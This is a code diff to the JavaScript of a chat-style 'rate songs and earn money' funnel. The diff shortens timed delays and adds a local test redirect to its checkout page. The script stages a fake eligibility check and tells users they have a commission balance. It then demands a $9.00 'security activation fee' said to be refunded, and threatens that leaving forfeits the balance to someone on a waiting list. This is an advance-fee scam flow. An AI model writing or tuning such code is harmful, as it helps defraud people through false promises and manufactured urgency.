@@ -865,9 +865,9 @@
         await say("We've selected five songs for you to listen to and rate. It takes just a couple of minutes.");
         media('/sp/songs/index.html', 355);
         await waitForSongs(600000);
-        await sleep(3000);
+        await sleep(800);
         await say('Click the button below to continue with your registration.');
-        await sleep(3000);
+        await sleep(800);
 
         // Etapa 02
         await askButton('Start Verification');
@@ -899,11 +899,11 @@
         await say('(Write below)');
         vars.nome = await askText('Enter your name here...');
         var checkingRow = await sayStatus('Checking...', 'pending');
-        await sleep(6000);
+        await sleep(2500);
 
         // Etapa 05
         await updateStatus(checkingRow, 'Just a moment...', 'pending');
-        await sleep(10000);
+        await sleep(2500);
         await updateStatus(checkingRow, 'Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your commission of ${{balance}}', 'success');
 
         // Etapa 06
@@ -937,11 +937,11 @@
         await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
         renderVsl2();
         await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
-        await sleep(5000);
+        await sleep(2500);
         await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
-        await sleep(4000);
+        await sleep(2000);
         await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
-        await sleep(3000);
+        await sleep(1500);
         await askButton('Unlock Withdrawal of ${{balance}}');
         var params = new URLSearchParams(window.location.search || '');
         if (vars.nome && !params.get('name')) params.set('name', vars.nome);
@@ -949,6 +949,9 @@
         if (!params.get('balance')) params.set('balance', finalBal);
         var qs = params.toString();
         var checkoutUrl = 'https://checkout.melodyrewards.com/' + (qs ? '?' + qs : '');
+        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+          checkoutUrl = '/checkout' + (qs ? '?' + qs : '');
+        }
         window.location.href = checkoutUrl;
 
       }
